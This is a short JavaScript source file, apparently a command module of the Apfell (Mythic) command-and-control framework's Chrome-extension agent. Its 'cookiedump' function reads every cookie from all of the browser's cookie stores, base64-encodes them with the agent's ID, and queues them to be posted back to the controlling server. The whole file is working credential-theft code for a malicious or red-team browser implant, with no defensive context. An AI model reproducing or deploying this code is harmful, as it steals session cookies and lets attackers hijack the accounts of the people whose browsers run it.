exports.cookiedump = function(task) {
    try {
        let results = [];
        chrome.cookies.getAllCookieStores(function(stores) {
            stores.forEach(function (store) {
                const filter = {};
                filter["storeId"] = store.id;
                chrome.cookies.getAll({"storeId": store.id}, function (cookies) {
                    let response = {'task_id':task.id, 'user_output':JSON.stringify(cookies, null, 2), 'completed':true};
                    let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
                    let enc = JSON.stringify(outer_response);
                    let final = apfell.apfellid + enc;
                    let msg = btoa(unescape(encodeURIComponent(final)));
                    out.push(msg);
                });
            });
        });
    } catch (error) {
        let response = {"task_id":task.id, "user_output":error.toString(), "completed": true, "status":"error"};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    }
};
COMMAND_ENDS_HERE